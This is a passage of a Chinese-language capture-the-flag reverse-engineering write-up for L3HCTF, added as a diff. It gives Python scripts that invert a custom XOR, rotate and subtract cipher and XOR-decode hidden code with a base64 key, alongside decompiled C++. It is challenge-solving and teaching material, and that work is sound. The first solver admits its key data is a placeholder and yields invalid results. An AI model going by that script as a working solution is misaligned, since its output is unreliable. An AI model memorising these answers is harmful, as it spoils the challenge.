0x54, 0x61, 0x75, 0x72, 0x69, 0x20, 0x60, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x60, 0x20, 0x70, 0x61, 0x6E, 0x69, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x64, 0x75, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x0A, 0x09, 0x00]
+s = [0xc, 0x15, 0x25, 0xa0, 0x63, 0x96, 0x40, 0x0a, 0x5c, 0x16, 0x65, 0x40, 0x29, 0x06, 0xe1, 0x1f, 0x90, 0x72, 0x2c, 0xe, 0x4c, 0xa, 0x2, 0xfc]
+
+import struct
+
+
+def solve():
+    """
+    根据逆向分析实现的解密函数
+    """
+
+    ANON_DATA = xor
+
+    # 这是加密后，程序期望看到的正确结果（27字节的密文）
+    # 我们从伪代码中的四次比较中构造出这个目标密文
+
+    # v8[0:8] == 0x0A409663A025150C
+    target_qword1 = struct.pack('<Q', 0x0A409663A025150C)
+
+    # v8[8:16] == 0x1FE106294065165C
+    target_qword2 = struct.pack('<Q', 0x1FE106294065165C)
+
+    # v8[16:24] == 0xFC020A4C0E2C7290
+    target_qword3 = struct.pack('<Q', 0xFC020A4C0E2C7290)
+
+    # v8[19:27] == *(_QWORD *)((char *)v19 + 3)
+    # v19 的内容是 qword3 + "O2*" = 90 72 2C 0E 4C 0A 02 FC 4F 32 2A
+    # v19[3:] 的内容是 0E 4C 0A 02 FC 4F 32 2A
+    target_qword4 = struct.pack('<Q', 0x2A324FFC020A4C0E)
+
+    # 组合成完整的27字节目标密文
+    encrypted_target = bytearray(27)
+    encrypted_target[0:8] = target_qword1
+    encrypted_target[8:16] = target_qword2
+    encrypted_target[16:24] = target_qword3
+    encrypted_target[19:27] = target_qword4
+
+    print(f"[+] 目标密文 (Hex): {encrypted_target.hex()}")
+
+    # ========================== 解密过程 ==========================
+
+    original_bytes = bytearray(27)  # 用于存放解密后的结果
+
+    # 遍历每一个字节，执行逆向操作
+    for i in range(27):
+        # --- 1. 重新计算加密时使用的索引和位移量 ---
+        v10 = i % 14
+        some_index = (2 * i + 1) % 14
+        shift = ANON_DATA[(i + 3) % 14 + 184] & 7
+
+        # --- 2. 逆转加密的第3步 (最终异或) ---
+        rolled_v11 = encrypted_target[i] ^ ANON_DATA[(i + 4) % 14 + 184]
+
+        # --- 3. 逆转加密的第2步 (循环右移 ROR) ---
+        v11 = ((rolled_v11 >> shift) | (rolled_v11 << (8 - shift))) & 0xFF
+
+        # --- 4. 逆转加密的第1步 (减法和异或) ---
+        term = (v11 - ANON_DATA[some_index + 184]) & 0xFF
+        original_byte = term ^ ANON_DATA[v10 + 184]
+
+        original_bytes[i] = original_byte
+
+    return original_bytes
+
+
+# --- 执行解密 ---
+if __name__ == "__main__":
+    print("正在执行解密算法...")
+    print("警告：解密所需关键数据 `ANON_DATA` 为占位符，结果无效！")
+    print("请务必从程序中提取真实数据并替换 `ANON_DATA`。\n")
+
+    try:
+        flag = solve()
+        print("-" * 40)
+        print(f"[!] 解密出的字节 (Hex): {flag.hex()}")
+        # 尝试用UTF-8解码，如果失败则说明结果不是可打印字符
+        try:
+            print(f"[SUCCESS] 解密出的Flag: {flag.decode('utf-8')}")
+        except UnicodeDecodeError:
+            print("[INFO] 解密结果不是有效的UTF-8字符串。")
+    except Exception as e:
+        print(f"[ERROR] 解密过程中发生错误: {e}")
+```
+
+## 终焉之门
+
+两个代码块实现了对于隐藏代码的加密，有趣的是base64解多层是
+
+flag is L3HCTF{.......
+
+wait what? how could it be so easy?
+
+```C++
+__int64 __fastcall sub_7FF65DB11450(_BYTE *a1, __int64 a2)
+{
+  unsigned __int64 v3; // rcx
+  __int64 result; // rax
+
+  if ( a2 != 1 )
+  {
+    *a1 ^= 0x56u;
+    v3 = 1;
+    if ( a2 != 2 )
+    {
+      do
+      {
+        result = (unsigned __int8)aVm0xd1ntuxlwa1[v3 % 0x1CC];
+        a1[v3++] ^= result;
+      }
+      while ( v3 != a2 - 1 );
+    }
+  }
+  return result;
+}
+```
+
+写个脚本进行解密
+
+```Python
+s = [0x75, 0x1B, 0x55, 0x0A, 0x17, 0x58, 0x21, 0x1A, 0x75, 0x6C, 0x5F, 0x67, 0x41, 0x52, 0x1F, 0x22, 0x33, 0x66, 0x6E, 0x03, 0x37, 0x3F, 0x03, 0x20, 0x27, 0x44, 0x22, 0x05, 0x35, 0x0D, 0x36, 0x26, 0x25, 0x5B, 0x4B, 0x22, 0x09, 0x13, 0x11, 0x65, 0x45, 0x75, 0x6E, 0x41, 0x3E, 0x39, 0x3A, 0x16, 0x35, 0x08, 0x0B, 0x08, 0x1E, 0x33, 0x19, 0x0A, 0x41, 0x7B, 0x44, 0x58, 0x7B, 0x66, 0x2A, 0x5C, 0x35, 0x0C, 0x14, 0x34, 0x20, 0x58, 0x33, 0x1D, 0x0B, 0x14, 0x6E, 0x65, 0x42, 0x77, 0x59, 0x78, 0x33, 0x39, 0x4F, 0x4C, 0x09, 0x27, 0x23, 0x1C, 0x20, 0x1F, 0x4C, 0x27, 0x39, 0x0F, 0x05, 0x06, 0x66, 0x6B, 0x54, 0x03, 0x30, 0x38, 0x2E, 0x1D, 0x3B, 0x0C, 0x19, 0x67, 0x42, 0x68, 0x7B, 0x6C, 0x38, 0x23, 0x3C, 0x07, 0x06, 0x1E, 0x44, 0x3B, 0x14, 0x05, 0x21, 0x2A, 0x33, 0x1D, 0x62, 0x79, 0x2D, 0x4D, 0x59, 0x5F, 0x26, 0x11, 0x3A, 0x09, 0x30, 0x04, 0x00, 0x3D, 0x11, 0x1D, 0x17, 0x6D, 0x76, 0x13, 0x4B, 0x5D, 0x39, 0x27, 0x2B, 0x3A, 0x27, 0x19, 0x5C, 0x19, 0x16, 0x23, 0x66, 0x49, 0x67, 0x47, 0x75, 0x57, 0x3C, 0x5E, 0x55, 0x20, 0x3F, 0x3F, 0x44, 0x6A, 0x41, 0x00, 0x78, 0x57, 0x34, 0x1F, 0x20, 0x07, 0x32, 0x34, 0x6E, 0x31, 0x0D, 0x05, 0x25, 0x07, 0x21, 0x46, 0x1B, 0x77, 0x2D, 0x4D, 0x5C, 0x19, 0x22, 0x12, 0x2D, 0x1C, 0x0A, 0x0F, 0x39, 0x3D, 0x11, 0x32, 0x03, 0x28, 0x08, 0x56, 0x58, 0x0A, 0x76, 0x4C, 0x3D, 0x19, 0x23, 0x28, 0x4C, 0x21, 0x4A, 0x26, 0x22, 0x51, 0x6E, 0x7B, 0x40, 0x6F, 0x77, 0x24, 0x30, 0x14, 0x31, 0x04, 0x06, 0x3D, 0x45, 0x56, 0x7A, 0x5B, 0x70, 0x5A, 0x24, 0x14, 0x05, 0x30, 0x01, 0x06, 0x42, 0x05, 0x27, 0x28, 0x3A, 0x0E, 0x02, 0x79, 0x76, 0x11, 0x21, 0x4B, 0x24, 0x29, 0x25, 0x59, 0x36, 0x07, 0x3E, 0x3E, 0x07, 0x35, 0x33, 0x42, 0x63, 0x6D, 0x5F, 0x73, 0x2B, 0x6D, 0x50, 0x1D, 0x30, 0x17, 0x0B, 0x26, 0x39, 0x7E, 0x03, 0x3D, 0x30, 0x62, 0x50, 0x05, 0x4D, 0x66, 0x38, 0x1A, 0x0D, 0x22, 0x05, 0x0F, 0x34, 0x68, 0x7F, 0x6C, 0x62, 0x43, 0x6A, 0x29, 0x23, 0x30, 0x20, 0x3C, 0x13, 0x66, 0x37, 0x27, 0x33, 0x35, 0x1B, 0x16, 0x76, 0x4D, 0x50, 0x3C, 0x73, 0x58, 0x0A, 0x23, 0x43, 0x36, 0x10, 0x37, 0x01, 0x3C, 0x27, 0x14, 0x37, 0x19, 0x15, 0x2C, 0x56, 0x59, 0x6C, 0x2E, 0x61, 0x64, 0x2F, 0x6C, 0x6B, 0x16, 0x27, 0x21, 0x3A, 0x47, 0x00, 0x43, 0x12, 0x22, 0x2E, 0x40, 0x66, 0x5C, 0x40, 0x7A, 0x00, 0x3D, 0x28, 0x30, 0x3F, 0x5E, 0x3D, 0x77, 0x59, 0x67, 0x67, 0x61, 0x72, 0x09, 0x40, 0x31, 0x04, 0x3D, 0x23, 0x5A, 0x19, 0x47, 0x00, 0x4F, 0x74, 0x12, 0x66, 0x77, 0x73, 0x15, 0x6E, 0x03, 0x3C, 0x19, 0x72, 0x17, 0x31, 0x27, 0x00, 0x06, 0x2E, 0x45, 0x61, 0x51, 0x71, 0x78, 0x48, 0x77, 0x6D, 0x4B, 0x15, 0x6A, 0x2B, 0x09, 0x72, 0x61, 0x36, 0x5E, 0x24, 0x25, 0x22, 0x4A, 0x3B, 0x39, 0x16, 0x78, 0x0F, 0x29, 0x2D, 0x23, 0x24, 0x3C, 0x22, 0x43, 0x23, 0x16, 0x20, 0x05, 0x21, 0x07, 0x11, 0x5E, 0x3F, 0x3B, 0x22, 0x77, 0x45, 0x77, 0x67, 0x5B, 0x01, 0x62, 0x6B, 0x5E, 0x3A, 0x4B, 0x39, 0x04, 0x54, 0x58, 0x09, 0x50, 0x27, 0x1A, 0x7D, 0x71, 0x66, 0x2C, 0x6B, 0x11, 0x50, 0x70, 0x76, 0x05, 0x02, 0x4F, 0x7E, 0x21, 0x00, 0x0A, 0x14, 0x00, 0x21, 0x08, 0x37, 0x00, 0x13, 0x17, 0x20, 0x5D, 0x52, 0x26, 0x22, 0x02, 0x5E, 0x36, 0x2C, 0x00, 0x6C, 0x19, 0x72, 0x68, 0x79, 0x47, 0x70, 0x77, 0x0A, 0x04, 0x10, 0x23, 0x34, 0x1D, 0x5A, 0x4C, 0x6E, 0x49, 0x77, 0x66, 0x66, 0x46, 0x3F, 0x03, 0x0C, 0x4B, 0x3A, 0x41, 0x69, 0x45, 0x74, 0x5E, 0x3B, 0x63, 0x68, 0x66, 0x50, 0x78, 0x7A, 0x3E, 0x1A, 0x32, 0x45, 0x35, 0x2A, 0x53, 0x68, 0x4B, 0x54, 0x6F, 0x47, 0x4B, 0x11, 0x15, 0x76, 0x31, 0x11, 0x13, 0x3D, 0x3F, 0x29, 0x00, 0x75, 0x56, 0x19, 0x77, 0x50, 0x6B, 0x61, 0x77, 0x50, 0x5C, 0x7A, 0x41, 0x43, 0x4C, 0x13, 0x1C, 0x0D, 0x2A, 0x2B, 0x6E, 0x7E, 0x07, 0x32, 0x79, 0x6A, 0x4D, 0x45, 0x58, 0x3C, 0x45, 0x7D, 0x34, 0x32, 0x13, 0x2D, 0x36, 0x11, 0x32, 0x38, 0x23, 0x35, 0x1A, 0x19, 0x38, 0x3B, 0x05, 0x3D, 0x20, 0x3C, 0x19, 0x5D, 0x43, 0x68, 0x67, 0x72, 0x5A, 0x77, 0x10, 0x5F, 0x15, 0x75, 0x10, 0x11, 0x69, 0x71, 0x78, 0x44, 0x3E, 0x0F, 0x46, 0x71, 0x18, 0x26, 0x09, 0x29, 0x05, 0x32, 0x66, 0x73, 0x52, 0x0D, 0x36, 0x29, 0x06, 0x36, 0x57, 0x1B, 0x0C, 0x3F, 0x03, 0x41, 0x5F, 0x3F, 0x42, 0x67, 0x2E, 0x6E, 0x66, 0x76, 0x73, 0x42, 0x66, 0x50, 0x53, 0x75, 0x4D, 0x11, 0x19, 0x39, 0x66, 0x30, 0x0A, 0x3D, 0x67, 0x19, 0x75, 0x42, 0x68, 0x76, 0x5A, 0x2A, 0x2B, 0x1F, 0x27, 0x32, 0x35, 0x02, 0x13, 0x3B, 0x19, 0x40, 0x33, 0x15, 0x42, 0x71, 0x59, 0x04, 0x41, 0x4C, 0x6B, 0x43, 0x76, 0x44, 0x54, 0x42, 0x66, 0x6E, 0x78, 0x21, 0x1C, 0x19, 0x2D, 0x35, 0x59, 0x7A, 0x43, 0x22, 0x37, 0x32, 0x16, 0x31, 0x0B, 0x67, 0x5C, 0x42, 0x67, 0x48, 0x53, 0x75, 0x10, 0x44, 0x73, 0x2D, 0x5C, 0x7A, 0x51, 0x71, 0x4E, 0x44, 0x73, 0x6D, 0x76, 0x50, 0x69, 0x74, 0x76, 0x00, 0x54, 0x12, 0x23, 0x7A, 0x41, 0x59, 0x4C, 0x4C, 0x41, 0x73, 0x68, 0x62, 0x6C, 0x76, 0x4A, 0x6A, 0x6B, 0x76, 0x76, 0x66, 0x79, 0x41, 0x66, 0x17, 0x27, 0x33, 0x35, 0x1B, 0x69, 0x32, 0x0C, 0x04, 0x26, 0x08, 0x42, 0x14, 0x7C, 0x48, 0x18, 0x44, 0x6B, 0x42, 0x34, 0x17, 0x2F, 0x35, 0x02, 0x1A, 0x04, 0x10, 0x1F, 0x01, 0x12, 0x28, 0x23, 0x0F, 0x6C, 0x6B, 0x5A, 0x66, 0x78, 0x75, 0x12, 0x54, 0x4B, 0x41, 0x76, 0x6A, 0x54, 0x75, 0x4C, 0x4C, 0x7A, 0x42, 0x36, 0x34, 0x31, 0x37, 0x5B, 0x61, 0x5D, 0x44, 0x67, 0x72, 0x68, 0x72, 0x4B, 0x15, 0x77, 0x42, 0x78, 0x71, 0x5A, 0x35, 0x53, 0x07, 0x0A, 0x74, 0x05, 0x7C, 0x5D, 0x73, 0x4E, 0x6E, 0x4A, 0x72, 0x4D, 0x72, 0x41, 0x74, 0x75, 0x44, 0x4F, 0x36, 0x3B, 0x7A, 0x51, 0x71, 0x78, 0x48, 0x77, 0x6D, 0x4B, 0x15, 0x6A, 0x76, 0x12, 0x58, 0x4B, 0x75, 0x11, 0x23, 0x38, 0x22, 0x4A, 0x30, 0x77, 0x5F, 0x78, 0x31, 0x3C, 0x34, 0x09, 0x21, 0x10, 0x32, 0x50, 0x22, 0x14, 0x0F, 0x41, 0x63, 0x1A, 0x22, 0x6C, 0x71, 0x5F, 0x76, 0x77, 0x58, 0x77, 0x76, 0x4B, 0x11, 0x72, 0x70, 0x74, 0x10, 0x1D, 0x76, 0x4D, 0x10, 0x58, 0x0D, 0x5F, 0x3A, 0x54, 0x34, 0x78, 0x51, 0x77, 0x12, 0x45, 0x11, 0x33, 0x3D, 0x33, 0x00, 0x0E, 0x22, 0x27, 0x37, 0x78, 0x7E, 0x1F, 0x3E, 0x37, 0x6D, 0x66, 0x7A, 0x59, 0x76, 0x12, 0x11, 0x67, 0x76, 0x4B, 0x11, 0x78, 0x45, 0x64, 0x62, 0x41, 0x72, 0x76, 0x2A, 0x03, 0x38, 0x34, 0x13, 0x3E, 0x00, 0x37, 0x32, 0x12, 0x3A, 0x35, 0x14, 0x42, 0x7C, 0x1B, 0x66, 0x0E, 0x76, 0x0C, 0x58, 0x40, 0x73, 0x53, 0x72, 0x72, 0x74, 0x4E, 0x6E, 0x78, 0x42, 0x66, 0x50, 0x78, 0x7A, 0x77, 0x54, 0x66, 0x45, 0x66, 0x7A, 0x53, 0x37, 0x19, 0x01, 0x35, 0x26, 0x50, 0x3B, 0x15, 0x76, 0x67, 0x54, 0x41, 0x79, 0x76, 0x6A, 0x54, 0x75, 0x4B, 0x19, 0x27, 0x68, 0x78, 0x72, 0x6C, 0x7A, 0x76, 0x7A, 0x41, 0x43, 0x4C, 0x44, 0x54, 0x44, 0x25, 0x2F, 0x3D, 0x33, 0x4E, 0x7A, 0x63, 0x5C, 0x4D, 0x10, 0x11, 0x72, 0x11, 0x75, 0x59, 0x73, 0x4B, 0x44, 0x78, 0x42, 0x3D, 0x40, 0x76, 0x76, 0x4E, 0x50, 0x77, 0x75, 0x66, 0x72, 0x75, 0x72, 0x4D, 0x54, 0x4A, 0x42, 0x67, 0x72, 0x13, 0x39, 0x1F, 0x75, 0x54, 0x75, 0x0D, 0x11, 0x3A, 0x25, 0x39, 0x07, 0x3C, 0x3E, 0x56, 0x30, 0x03, 0x37, 0x31, 0x6B, 0x4C, 0x24, 0x36, 0x13, 0x49, 0x68, 0x66, 0x6A, 0x49, 0x72, 0x12, 0x48, 0x77, 0x76, 0x4D, 0x15, 0x57, 0x76, 0x12, 0x6E, 0x53, 0x75, 0x05, 0x38, 0x27, 0x42, 0x24, 0x50, 0x4E, 0x75, 0x1E, 0x0C, 0x16, 0x2E, 0x2D, 0x0E, 0x1C, 0x3B, 0x33, 0x58, 0x0E, 0x4F, 0x78, 0x25, 0x45, 0x07, 0x73, 0x7A, 0x63, 0x77, 0x66, 0x79, 0x5A, 0x75, 0x4D, 0x48, 0x7A, 0x45, 0x4B, 0x7A, 0x48, 0x79, 0x5A, 0x66, 0x12, 0x17, 0x37, 0x07, 0x1F, 0x3D, 0x22, 0x2F, 0x2C, 0x33, 0x30, 0x03, 0x29, 0x7D, 0x1A, 0x07, 0x4B, 0x70, 0x67, 0x30, 0x59, 0x78, 0x4E, 0x2C, 0x6D, 0x68, 0x67, 0x48, 0x53, 0x75, 0x10, 0x44, 0x73, 0x76, 0x76, 0x7A, 0x51, 0x71, 0x4E, 0x44, 0x73, 0x6D, 0x34, 0x02, 0x2C, 0x35, 0x3D, 0x58, 0x3F, 0x41, 0x66, 0x7A, 0x53, 0x43, 0x66, 0x4C, 0x41, 0x73, 0x68, 0x62, 0x6C, 0x2B, 0x60, 0x6A, 0x6B, 0x76, 0x76, 0x66, 0x79, 0x41, 0x66, 0x44, 0x73, 0x72, 0x76, 0x13, 0x57, 0x25, 0x08, 0x50, 0x76, 0x67, 0x0B, 0x6E, 0x77, 0x43, 0x65, 0x44, 0x76, 0x42, 0x77, 0x58, 0x50, 0x76, 0x4D, 0x54, 0x0C, 0x6E, 0x4C, 0x7A, 0x53, 0x7A, 0x64, 0x72, 0x77, 0x41, 0x5A, 0x66, 0x78, 0x75, 0x12, 0x54, 0x4B, 0x41, 0x3F, 0x24, 0x00, 0x75, 0x0E, 0x4C, 0x67, 0x42, 0x27, 0x32, 0x35, 0x35, 0x5B, 0x05, 0x33, 0x05, 0x33, 0x33, 0x13, 0x7F, 0x46, 0x46, 0x27, 0x3F, 0x63, 0x5B, 0x5A, 0x76, 0x12, 0x54, 0x4F, 0x74, 0x12, 0x66, 0x77, 0x73, 0x4E, 0x6E, 0x4A, 0x72, 0x4D, 0x72, 0x08, 0x3A, 0x21, 0x44, 0x0E, 0x6D, 0x0C, 0x7A, 0x02, 0x25, 0x39, 0x0B, 0x3C, 0x12, 0x0F, 0x54, 0x3E, 0x37, 0x69, 0x55, 0x46, 0x26, 0x41, 0x17, 0x6D, 0x5C, 0x4A, 0x72, 0x77, 0x42, 0x78, 0x62, 0x68, 0x75, 0x4A, 0x6A, 0x6F, 0x76, 0x11, 0x76, 0x55, 0x74, 0x1F, 0x3A, 0x08, 0x31, 0x5A, 0x15, 0x31, 0x37, 0x23, 0x19, 0x0C, 0x25, 0x1B, 0x1A, 0x79, 0x0D, 0x74, 0x0D, 0x1D, 0x37, 0x4D, 0x6E, 0x58, 0x06, 0x0A, 0x44, 0x54, 0x75, 0x78, 0x4C, 0x77, 0x41, 0x11, 0x50, 0x70, 0x76, 0x4C, 0x44, 0x4F, 0x76, 0x66, 0x4C, 0x37, 0x21, 0x09, 0x2F, 0x01, 0x6D, 0x66, 0x7A, 0x59, 0x76, 0x12, 0x11, 0x67, 0x76, 0x4B, 0x11, 0x78, 0x45, 0x64, 0x3F, 0x6B, 0x58, 0x76, 0x79, 0x57, 0x79, 0x77, 0x58, 0x41, 0x44, 0x76, 0x66, 0x53, 0x41, 0x25, 0x05, 0x1A, 0x32, 0x66, 0x77, 0x06, 0x6C, 0x67, 0x58, 0x4B, 0x73, 0x11, 0x69, 0x58, 0x74, 0x4E, 0x6E, 0x78, 0x42, 0x66, 0x0B, 0x52, 0x7A, 0x77, 0x54, 0x66, 0x45, 0x66, 0x7A, 0x53, 0x75, 0x4B, 0x44, 0x74, 0x6D, 0x4B, 0x11, 0x15, 0x3F, 0x29, 0x00, 0x41, 0x3B, 0x76, 0x77, 0x54, 0x26, 0x1F, 0x58, 0x39, 0x09, 0x07, 0x36, 0x2D, 0x2E, 0x37, 0x01, 0x4C, 0x4E, 0x1F, 0x14, 0x29, 0x5F, 0x4C, 0x6E, 0x6E, 0x76, 0x4E, 0x62, 0x79, 0x76, 0x4D, 0x10, 0x11, 0x72, 0x11, 0x75, 0x59, 0x73, 0x4B, 0x0D, 0x36, 0x16, 0x66, 0x2B, 0x76, 0x6B, 0x4E, 0x03, 0x23, 0x34, 0x25, 0x39, 0x0A, 0x36, 0x0C, 0x00, 0x0B, 0x39, 0x6A, 0x7F, 0x09, 0x27, 0x36, 0x6E, 0x3F, 0x75, 0x10, 0x11, 0x69, 0x71, 0x78, 0x44, 0x77, 0x41, 0x12, 0x71, 0x57, 0x76, 0x4A, 0x66, 0x41, 0x24, 0x32, 0x2F, 0x11, 0x09, 0x19, 0x2E, 0x08, 0x26, 0x53, 0x33, 0x24, 0x26, 0x46, 0x1E, 0x2A, 0x76, 0x0F, 0x6E, 0x1A, 0x3B, 0x18, 0x7E, 0x32, 0x42, 0x7B, 0x4D, 0x53, 0x37, 0x44, 0x43, 0x7D, 0x6D, 0x66, 0x71, 0x58, 0x7A, 0x67, 0x19, 0x75, 0x42, 0x75, 0x76, 0x15, 0x7A, 0x68, 0x50, 0x63, 0x35, 0x34, 0x3C, 0x1B, 0x3E, 0x56, 0x62, 0x7A, 0x45, 0x4B, 0x7A, 0x48, 0x79, 0x5A, 0x66, 0x41, 0x43, 0x76, 0x44, 0x09, 0x68, 0x4C, 0x6E, 0x78, 0x72, 0x4B, 0x50, 0x79, 0x76, 0x11, 0x7A, 0x4B, 0x6D, 0x67, 0x32, 0x18, 0x26, 0x0B, 0x6E, 0x67, 0x54, 0x7D, 0x62, 0x53, 0x75, 0x10, 0x44, 0x73, 0x76, 0x76, 0x7A, 0x51, 0x71, 0x4E, 0x44, 0x28, 0x47, 0x76, 0x50, 0x69, 0x74, 0x76, 0x43, 0x15, 0x41, 0x66, 0x7A, 0x53, 0x43, 0x66, 0x4C, 0x41, 0x73, 0x2A, 0x2D, 0x23, 0x3A, 0x4A, 0x25, 0x20, 0x76, 0x6B, 0x66, 0x2D, 0x13, 0x33, 0x01, 0x68, 0x58, 0x76, 0x50, 0x16, 0x76, 0x4D, 0x50, 0x67, 0x73, 0x11, 0x44, 0x77, 0x43, 0x65, 0x44, 0x76, 0x42, 0x31, 0x17, 0x02, 0x76, 0x45, 0x1D, 0x19, 0x10, 0x4C, 0x33, 0x53, 0x67, 0x64, 0x62, 0x6C, 0x41, 0x13, 0x66, 0x64, 0x75, 0x03, 0x42, 0x50, 0x41, 0x3F, 0x61, 0x5F, 0x7C, 0x66, 0x4C, 0x7A, 0x42, 0x74, 0x66, 0x74, 0x76, 0x10, 0x7A, 0x77, 0x44, 0x67, 0x72, 0x68, 0x72, 0x4B, 0x4E, 0x5D, 0x42, 0x78, 0x71, 0x5A, 0x76, 0x12, 0x54, 0x4F, 0x74, 0x12, 0x66, 0x77, 0x73, 0x4E, 0x6E, 0x4A, 0x72, 0x4D, 0x72, 0x41, 0x3D, 0x33, 0x44, 0x47, 0x3E, 0x45, 0x3B, 0x12, 0x3A, 0x07, 0x0C, 0x36, 0x39, 0x0A, 0x6E, 0x23, 0x0B, 0x12, 0x59, 0x56, 0x75, 0x19, 0x29, 0x3F, 0x26, 0x02, 0x37, 0x25, 0x39, 0x31, 0x1F, 0x68, 0x78, 0x4A, 0x78, 0x7F, 0x7F, 0x18, 0x5C, 0x55, 0x74, 0x4C, 0x6E, 0x49, 0x72, 0x11, 0x6A, 0x75, 0x76, 0x77, 0x58, 0x77, 0x76, 0x4B, 0x11, 0x72, 0x70, 0x74, 0x10, 0x46, 0x76, 0x67, 0x10, 0x58, 0x44, 0x11, 0x6E, 0x54, 0x75, 0x78, 0x4C, 0x77, 0x41, 0x11, 0x50, 0x70, 0x76, 0x4C, 0x44, 0x4F, 0x76, 0x66, 0x4C, 0x75, 0x73, 0x4C, 0x21, 0x01, 0x76, 0x51, 0x7A, 0x1F, 0x37, 0x5E, 0x42, 0x22, 0x6D, 0x4B, 0x3B, 0x78, 0x45, 0x64, 0x62, 0x41, 0x72, 0x76, 0x79, 0x57, 0x79, 0x77, 0x58, 0x41, 0x44, 0x76, 0x66, 0x53, 0x41, 0x66, 0x44, 0x49, 0x77, 0x66, 0x66, 0x51, 0x24, 0x08, 0x19, 0x00, 0x68, 0x11, 0x43, 0x58, 0x74, 0x4E, 0x6E, 0x78, 0x42, 0x66, 0x50, 0x78, 0x7A, 0x77, 0x54, 0x66, 0x45, 0x66, 0x7A, 0x53, 0x75, 0x4B, 0x44, 0x29, 0x47, 0x4B, 0x11, 0x15, 0x76, 0x67, 0x54, 0x41, 0x79, 0x76, 0x6A, 0x54, 0x75, 0x4B, 0x19, 0x7A, 0x42, 0x25, 0x58, 0x6C, 0x7A, 0x76, 0x7A, 0x41, 0x43, 0x4C, 0x44, 0x54, 0x44, 0x66, 0x6E, 0x6E, 0x76, 0x4E, 0x62, 0x2F, 0x33, 0x1F, 0x54, 0x58, 0x31, 0x45, 0x75, 0x44, 0x73, 0x04, 0x0F, 0x78, 0x5D, 0x66, 0x7B, 0x76, 0x6C, 0x4E, 0x5D, 0x66, 0x6E, 0x4C, 0x72, 0x75, 0x72, 0x4D, 0x54, 0x4A, 0x42, 0x67, 0x72, 0x5A, 0x77, 0x4B, 0x75, 0x15, 0x75, 0x10, 0x43, 0x2C, 0x25, 0x2D, 0x16, 0x39, 0x5A, 0x38, 0x71, 0x57, 0x76, 0x4A, 0x66, 0x41, 0x77, 0x66, 0x6E, 0x52, 0x42, 0x66, 0x37, 0x63, 0x58, 0x12, 0x48, 0x77, 0x76, 0x4D, 0x15, 0x57, 0x76, 0x12, 0x6E, 0x53, 0x75, 0x0F, 0x37, 0x20, 0x07, 0x66, 0x41, 0x4B, 0x6F, 0x67, 0x58, 0x57, 0x6D, 0x66, 0x71, 0x58, 0x7A, 0x67, 0x19, 0x75, 0x42, 0x75, 0x2D, 0x3F, 0x7A, 0x68, 0x50, 0x63, 0x77, 0x66, 0x79, 0x5A, 0x75, 0x4D, 0x48, 0x7A, 0x45, 0x4B, 0x7A, 0x48, 0x30, 0x14, 0x32, 0x41, 0x00, 0x76, 0x59, 0x54, 0x11, 0x32, 0x2F, 0x3B, 0x39, 0x34, 0x14, 0x38, 0x22, 0x50, 0x01, 0x46, 0x60, 0x34, 0x21, 0x24, 0x6E, 0x64, 0x6E, 0x76, 0x42, 0x67, 0x48, 0x53, 0x75, 0x10, 0x44, 0x73, 0x76, 0x76, 0x7A, 0x51, 0x71, 0x4E, 0x0D, 0x35, 0x6D, 0x7E, 0x13, 0x69, 0x69, 0x6B, 0x43, 0x05, 0x48, 0x66, 0x33, 0x03, 0x43, 0x7B, 0x4C, 0x14, 0x3A, 0x26, 0x36, 0x64, 0x37, 0x18, 0x2D, 0x62, 0x6D, 0x5C, 0x66, 0x79, 0x41, 0x66, 0x44, 0x73, 0x72, 0x76, 0x50, 0x16, 0x76, 0x4D, 0x50, 0x67, 0x73, 0x11, 0x06, 0x25, 0x06, 0x24, 0x0F, 0x6D, 0x68, 0x77, 0x58, 0x50, 0x76, 0x4D, 0x54, 0x57, 0x44, 0x4C, 0x7A, 0x53, 0x7A, 0x39, 0x58, 0x5D, 0x41, 0x5A, 0x66, 0x78, 0x75, 0x12, 0x54, 0x4B, 0x41, 0x76, 0x6A, 0x54, 0x31, 0x09, 0x0A, 0x3B, 0x17, 0x38, 0x32, 0x6E, 0x5C, 0x10, 0x7A, 0x77, 0x44, 0x67, 0x72, 0x68, 0x72, 0x4B, 0x15, 0x77, 0x42, 0x78, 0x71, 0x5A, 0x76, 0x44, 0x11, 0x1D, 0x30, 0x5B, 0x25, 0x23, 0x73, 0x53, 0x6E, 0x5F, 0x62, 0x5D, 0x69, 0x6B, 0x74, 0x75, 0x44, 0x4F, 0x6D, 0x11, 0x7A, 0x51, 0x71, 0x78, 0x48, 0x77, 0x6D, 0x4B, 0x15, 0x6A, 0x24, 0x57, 0x0C, 0x1E, 0x27, 0x5F, 0x71, 0x5C, 0x76, 0x4A, 0x72, 0x77, 0x42, 0x78, 0x62, 0x68, 0x28, 0x60, 0x40, 0x6F, 0x76, 0x11, 0x76, 0x55, 0x74, 0x4C, 0x6E, 0x00, 0x22, 0x1A, 0x77, 0x67, 0x6D, 0x5D, 0x58, 0x77, 0x76, 0x4B, 0x4C, 0x58, 0x70, 0x74, 0x10, 0x1D, 0x20, 0x08, 0x42, 0x1C, 0x0D, 0x52, 0x3A, 0x54, 0x68, 0x78, 0x59, 0x67, 0x50, 0x0A, 0x7A, 0x2D, 0x5C, 0x00, 0x00]
+s[0] ^= 0x56
+xor = b"Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0="
+for i in range(1, 2318):
+    s[i] ^= xor[i%460]
+print("".join(map(chr, s)))
+
